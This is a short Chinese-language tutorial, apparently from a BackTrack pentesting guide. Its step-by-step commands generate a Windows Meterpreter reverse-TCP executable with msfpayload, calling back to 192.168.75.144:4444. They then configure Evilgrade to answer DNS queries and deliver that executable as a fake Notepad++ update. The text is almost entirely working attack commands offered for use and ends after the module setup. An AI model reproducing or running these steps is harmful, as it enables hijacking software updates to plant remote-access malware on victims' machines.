
## 第一步

```
msfpayload windows/Meterpreter/reverse_tcp lhost=192.168.75.144 lport=4444 X > xen.exe
```

上面的命令将创建一个 Windows 二进制文件，它将通过端口 `4444` 连接到你处，允许你访问 Meterpreter 会话。

## 第二步

从 `/pentest/exploits/isr-evilgrade` 目录启动 Evilgrade。要这样做，请使用以下命令：

```
root@bt:~# cd /pentest/exploits/isr-evilgrade
```

```
root@bt:/pentest/exploits/isr-evilgrade# ./eviligrade
```

## 第三步

你需要设置 `DNSAnswerIP`，它是执行所有 DNS 回答的 IP。使用以下命令：

```
evilgrade> set DNSAnswerIP 192.168.75.144
```

之后，你需要配置你想要使用的模块。输入 `show module` 命令，它将列出所有可用模块。在这种情况下，你需要配置 `notepadplus`。

```
evilgrade> configure notepadplus
```

执行 `show options` 命令以查看你可以配合此模块使用的选项列表。选择你需要的选项，并为你选择的选项运行以下命令（我们选择了 `agent/root/xen.exe`）。

```
evilgrade(notepadplus)> set agent/root/xen.exe
```
